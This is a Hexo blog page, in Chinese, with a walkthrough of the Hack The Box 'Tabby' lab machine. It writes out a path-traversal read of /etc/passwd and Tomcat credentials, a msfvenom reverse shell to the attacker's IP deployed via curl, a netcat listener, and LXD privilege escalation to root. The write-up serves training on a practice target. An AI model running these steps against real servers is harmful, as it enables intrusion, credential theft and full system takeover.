@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="M1nzhi">
+
+
+
+
+
+<title>hackthebox-tabby-writeup | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">M1nzhi&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Category</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">M1nzhi&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Category</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">hackthebox-tabby-writeup</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">M1nzhi</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 16, 2020&nbsp;&nbsp;22:44:18</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="扫描IP"><a href="#扫描IP" class="headerlink" title="扫描IP"></a><strong>扫描IP</strong></h3><p><strong><code>$nmap -sV -sC -oA scan 10.10.10.194</code></strong></p>
+<p><img src="/2020/07/16/hackthebox-tabby-writeup/1.png" alt></p>
+<p>思路：1.暴力猜解SSH，2.tomcat弱口令 3.fuzzing 80端口应用</p>
+<p>尝试1，无果，尝试2，无果，尝试3，得到有用信息</p>
+<p><strong>fuzzing发现LFI漏洞，并得到tomcat用户名和密码</strong></p>
+<p>1.点击导航栏中的“新闻”，跳转到<strong><code>http://10.10.10.194/news.php?file=statement</code></strong></p>
+<p>2.<a href="http://10.10.10.194/news.php?file=../../../../../etc/passwd" target="_blank" rel="noopener">http://10.10.10.194/news.php?file=../../../../../etc/passwd</a></p>
+<p><img src="/2020/07/16/hackthebox-tabby-writeup/3.png" alt></p>
+<p>3.用seclists字典进行fuzzing <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists</a></p>
+<p>找到了/etc/apache2/httpd.conf , 仔细观察了一下没有发现特别有用信息</p>
+<p>尝试fuzzing <strong>/ proc / self / environ</strong>，<strong>/ proc / self / fd</strong></p>
+<p>TIPS：特别关注一下/ proc / self / environ，/ proc / self / fd，/var/log/apache2/access.log。因为这些文件可以帮助您进行日志定位以获得RCE</p>
+<p>fuzzing了半天，啥有用的东西都没捞到</p>
+<p>打开tomcat应用，页面内容包含了一些敏感的信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">安装目录：&#x2F;usr&#x2F;share&#x2F;tomcat9</span><br><span class="line">工作目录：&#x2F;var&#x2F;lib&#x2F;webapps</span><br><span class="line">用户信息：&#x2F;etc&#x2F;tomcat-users.xml</span><br></pre></td></tr></table></figure>
+
+<p>fuzzing这几个path，最后得到了tomcat-user</p>
+<p><code>**http://10.10.10.194/news.php**</code><strong><code>?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml</code></strong></p>
+<p><img src="/2020/07/16/hackthebox-tabby-writeup/4.png" alt></p>
+<p>4.上传webshell</p>
+<p>登录manager/html，但是显示禁止访问，如图：</p>
+<p><img src="/2020/07/16/hackthebox-tabby-writeup/5.png" alt></p>
+<p>登录host-manager/html</p>
+<p><img src="/2020/07/16/hackthebox-tabby-writeup/6.png" alt></p>
+<p>经过googling，虽然禁用了tomcat-gui，但是没有禁用tomcat-script，可以通过tomcat接口进行部署应用</p>
+<p>参考：<a href="https://gist.github.com/pete911/6111816" target="_blank" rel="noopener">https://gist.github.com/pete911/6111816</a></p>
+<h3 id="创建reverse"><a href="#创建reverse" class="headerlink" title="创建reverse"></a><strong>创建</strong><code>reverse</code></h3><p><strong><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.197 LPORT=1234 -f war &gt; shell.war</code></strong></p>
+<h3 id="部署shell"><a href="#部署shell" class="headerlink" title="部署shell"></a><strong>部署shell</strong></h3><p><strong><code>$curl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; -T shell.war &#39;http://10.10.10.194:8080/manager/text/deploy?path=/my-shell&#39;</code></strong></p>
+<h3 id="列出已部署的shell"><a href="#列出已部署的shell" class="headerlink" title="**列出已部署的shell"></a>**列出已部署的shell</h3><p><strong><code>$curl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; http://10.10.10.194:8080/manager/text/list</code></strong></p>
+<h3 id="通过nc建立连接"><a href="#通过nc建立连接" class="headerlink" title="通过nc建立连接"></a><strong>通过nc建立连接</strong></h3><p><strong><code>$nc -nvlp 1234</code></strong></p>
+<p><strong><code>$curl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; http://10.10.10.194:8080/my-shell/</code></strong></p>
+<p><img src="/2020/07/16/hackthebox-tabby-writeup/7.png" alt></p>
+<h3 id="获得一个shell"><a href="#获得一个shell" class="headerlink" title="获得一个shell"></a>获得一个shell</h3><p><strong><code>$python3 -c &#39;import pty;pty.spwn(&quot;/bin/bash&quot;)&#39;</code></strong></p>
+<p><img src="/2020/07/16/hackthebox-tabby-writeup/8.png" alt></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>安利一款linux信息枚举工具：<a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">https://github.com/rebootuser/LinEnum</a></p>
+<p>通过LinEnum扫描得到：<strong><code>/var/www/html/files/16162020_backup.zip</code></strong></p>
+<p>下载发现是一个的加密文件，用fcrackzip进行暴力破解</p>
+<p><img src="/2020/07/16/hackthebox-tabby-writeup/9.png" alt></p>
+<p>拿着这个密码去登录/etc/passwd中的ash用户</p>
+<p><strong>$cat user.txt</strong></p>
+<p><img src="/2020/07/16/hackthebox-tabby-writeup/10.png" alt></p>
+<h3 id="获取root权限"><a href="#获取root权限" class="headerlink" title="获取root权限"></a>获取root权限</h3><p>查看具有root权限的SUID可执行文件，如图：</p>
+<p><img src="/2020/07/16/hackthebox-tabby-writeup/1.jpg" alt></p>
+<p>刚才我是以tomcat用户运行LinEnum，现在我以ash用户再次运行linEnum</p>
+<p><img src="/2020/07/16/hackthebox-tabby-writeup/2.jpg" alt></p>
+<p>谷歌搜索<strong><code>Privilege escalation using lxd</code></strong>,发现了<a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank" rel="noopener">这篇</a>文章很有用。直接按照它的步骤拿到了root</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">**$git clone https:&#x2F;&#x2F;github.com&#x2F;saghul&#x2F;lxd-alpine-builder.git**</span><br><span class="line">**$cd lxd-alpine-builder**</span><br><span class="line">**$sudo bash build-alpine**</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/16/hackthebox-tabby-writeup/3.jpg" alt></p>
+<p>在tabby机器上执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">**$wget 10.10.14.197&#x2F;alpine-v3.12-x86_64-20200625_0040.tar.gz**</span><br><span class="line">**$lxc image import .&#x2F;alpine-v3.12-x86_64-20200625_0040.tar.gz --alias myimage**</span><br><span class="line">**$lxc image list**</span><br><span class="line">**$lxc init myimage ethicalhacs -c security.privileged&#x3D;true**</span><br><span class="line">**$ lxc config device add ethicalhacs mydevice disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true**</span><br><span class="line">**$ lxc start ethicalhacs**</span><br><span class="line">**$ lxc exec ethicalhacs &#x2F;bin&#x2F;sh**</span><br><span class="line"># cd &#x2F;mnt&#x2F;root&#x2F;root</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/16/hackthebox-tabby-writeup/11.png" alt></p>
+<p><img src="/2020/07/16/hackthebox-tabby-writeup/12.png" alt></p>
+<p><strong>Got flag</strong></p>
+<p><strong><code>$cd /mnt/root/root</code></strong></p>
+<p><strong><code>$cat root.txt</code></strong> </p>
+<p><img src="/2020/07/16/hackthebox-tabby-writeup/13.png" alt></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然机器的技术难度不高，但是枚举还是花了不少时间，特别是fuzz tomcat-user.xml的时候，还有就是enum到back.zip文件的时候感觉没什么用，所以一开始压根就没尝试，看到forum上提醒才知道原来zip的密码就是ash的密码</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>M1nzhi</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2020/07/16/hackthebox-tabby-writeup/">http://yoursite.com/2020/07/16/hackthebox-tabby-writeup/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Hackthebox/"># Hackthebox</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/06/11/phpaduit-in-array/">phpaduit(in_array)</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© M1nzhi | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
